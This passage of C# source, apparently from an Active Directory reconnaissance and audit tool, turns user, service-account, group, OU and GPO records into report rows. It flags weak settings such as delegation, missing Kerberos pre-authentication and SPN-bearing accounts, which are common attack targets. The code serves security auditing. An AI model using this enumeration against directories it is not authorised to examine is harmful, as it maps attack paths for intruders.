                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) == "0")
                    {
                        if ((bool) AdUser.Members["PasswordNeverExpires"].Value == false)
                        {
                            MustChangePasswordatLogon = true;
                        }
                    }
                    if (AdUser.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdUser.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                    //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 9223372036854775807)
                    //{
                        //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 0)
                        if (AdUser.Members["AccountExpirationDate"].Value != null)
                        {
                            try
                            {
                                //AccountExpires = DateTime.FromFileTime((long)(AdUser.Members["accountExpires"].Value));
                                // AccountExpirationDate is accountExpires converted to local time
                                AccountExpires = Convert.ToDateTime(AdUser.Members["AccountExpirationDate"].Value);
                                AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                            }
                            catch //(Exception e)
                            {
                                //Console.WriteLine("Exception caught: {0}", e);
                            }
                        }
                    //}
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');
                    if (AdUser.Members["msDS-SupportedEncryptionTypes"].Value != null)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Members["msDS-SupportedEncryptionTypes"].Value;
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    if (AdUser.Members["UserAccountControl"].Value != null)
                    {
                        AccountNotDelegated = !((bool) AdUser.Members["AccountNotDelegated"].Value);
                        if ((bool) AdUser.Members["TrustedForDelegation"].Value)
                        {
                            DelegationType = "Unconstrained";
                            DelegationServices = "Any";
                        }
                        if (AdUser.Members["msDS-AllowedToDelegateTo"] != null)
                        {
                            Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["msDS-AllowedToDelegateTo"].Value;
                            if (delegateto.Value != null)
                            {
                                DelegationType = "Constrained";
                                foreach (var value in delegateto)
                                {
                                    DelegationServices = DelegationServices + "," + Convert.ToString(value);
                                }
                                DelegationServices = DelegationServices.TrimStart(',');
                            }
                        }
                        if ((bool) AdUser.Members["TrustedToAuthForDelegation"].Value == true)
                        {
                            DelegationProtocol = "Any";
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = "Kerberos";
                        }
                    }

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        HasSPN = false;
                    }
                    else
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdUser.Members["SamAccountName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Name", CleanString(AdUser.Members["Name"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", AdUser.Members["CannotChangePassword"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", AdUser.Members["PasswordNeverExpires"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", AdUser.Members["AllowReversiblePasswordEncryption"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", AdUser.Members["SmartcardLogonRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", AccountNotDelegated));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", AdUser.Members["UseDESKeyOnly"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", AdUser.Members["DoesNotRequirePreAuth"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AdUser.Members["LockedOut"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", AdUser.Members["PasswordExpired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", AdUser.Members["PasswordNotRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", AdUser.Members["LogonWorkstations"].Value));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", AdUser.Members["AdminCount"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", AdUser.Members["primaryGroupID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SID", AdUser.Members["SID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("HasSPN", HasSPN));
                    UserObj.Members.Add(new PSNoteProperty("Description", CleanString(AdUser.Members["Description"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Title", CleanString(AdUser.Members["Title"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Department", CleanString(AdUser.Members["Department"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Company", CleanString(AdUser.Members["Company"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Manager", CleanString(AdUser.Members["Manager"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Info", CleanString(AdUser.Members["Info"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", CleanString(AdUser.Members["Mobile"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Email", CleanString(AdUser.Members["mail"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", AdUser.Members["homeDirectory"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", AdUser.Members["profilePath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", AdUser.Members["ScriptPath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", AdUser.Members["UserAccountControl"].Value));
                    UserObj.Members.Add(new PSNoteProperty("First Name", CleanString(AdUser.Members["givenName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", CleanString(AdUser.Members["middleName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", CleanString(AdUser.Members["sn"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Country", CleanString(AdUser.Members["c"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", AdUser.Members["whenCreated"].Value));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", AdUser.Members["whenChanged"].Value));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdUser.Members["DistinguishedName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", CleanString(AdUser.Members["CanonicalName"].Value)));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Members["userAccountControl"].Value != null)
                    {
                        var userFlags = (UACFlags) AdUser.Members["userAccountControl"].Value;
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) != "0")
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)AdUser.Members["pwdLastSet"].Value);
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberOfAttribute = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["memberof"].Value;
                    if (MemberOfAttribute.Value != null)
                    {
                        foreach (string Member in MemberOfAttribute)
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    string Description = CleanString(AdUser.Members["Description"].Value);
                    string PrimaryGroupID = Convert.ToString(AdUser.Members["primaryGroupID"].Value);
                    foreach (string SPN in SPNs)
                    {
                        string[] SPNArray = SPN.Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("Username", CleanString(AdUser.Members["SamAccountName"].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", CleanString(AdUser.Members["Name"].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string ManagedByValue = Convert.ToString(AdGroup.Members["managedBy"].Value);
                    string ManagedBy = "";
                    string SIDHistory = "";

                    if (AdGroup.Members["managedBy"].Value != null)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { "CN=" },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { "OU=" },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(',');
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Members["SamAccountName"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", AdGroup.Members["AdminCount"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", AdGroup.Members["GroupCategory"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", AdGroup.Members["GroupScope"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", AdGroup.Members["sid"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", CleanString(AdGroup.Members["Description"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Members["whenCreated"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Members["whenChanged"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Members["DistinguishedName"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Members["CanonicalName"].Value));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection ReplValueMetaData = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members["msDS-ReplValueMetaData"].Value;

                    if (ReplValueMetaData.Value != null)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace("\x00", "").Replace("&","&amp;"));

                            if (ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText != "1601-01-01T00:00:00Z")
                            {
                                Action = "Removed";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = "Added";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group Name", AdGroup.Members["SamAccountName"].Value));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group DistinguishedName", CleanString(AdGroup.Members["DistinguishedName"].Value)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Member DistinguishedName", CleanString(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["pszObjectDn"].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Action", Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Age (Days)", DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Age (Days)", DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Date", AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Date", RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeCreated", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeDeleted", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    ADWSClass.AdGroupDictionary.Add((Convert.ToString(AdGroup.Properties["SID"].Value)), (Convert.ToString(AdGroup.Members["SamAccountName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // based on https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    PSObject AdGroup = (PSObject) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = Convert.ToString(AdGroup.Members["samaccounttype"].Value);
                    string ObjectClass = Convert.ToString(AdGroup.Members["ObjectClass"].Value);
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";
                    string PrimaryGroupID = "";
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == "foreignSecurityPrincipal")
                    {
                        AccountType = "foreignSecurityPrincipal";
                        MemberUserName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberName = null;
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = "trust";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdOU = (PSObject) record;
                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Members["Name"].Value));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", AdOU.Members["Description"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Members["whenCreated"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Members["whenChanged"].Value));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Members["DistinguishedName"].Value));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Members["DisplayName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Members["Name"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Members["whenCreated"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Members["whenChanged"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Members["DistinguishedName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Members["gPCFileSysPath"].Value));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;
                    ADWSClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Members["DistinguishedName"].Value).ToUpper()), (Convert.ToString(AdGPO.Members["DisplayName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSOM = (PSObject) record;
                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = Convert.ToString(AdSOM.Members["gPLink"].Value);
                    string GPOName = null;

                    Depth = (Convert.ToString(AdSOM.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1;
                    if (AdSOM.Members["gPOptions"].Value != null && (int) AdSOM.Members["gPOptions"].Value == 1)
                    {
                        BlockInheritance = true;
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = ADWSClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? ADWSClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
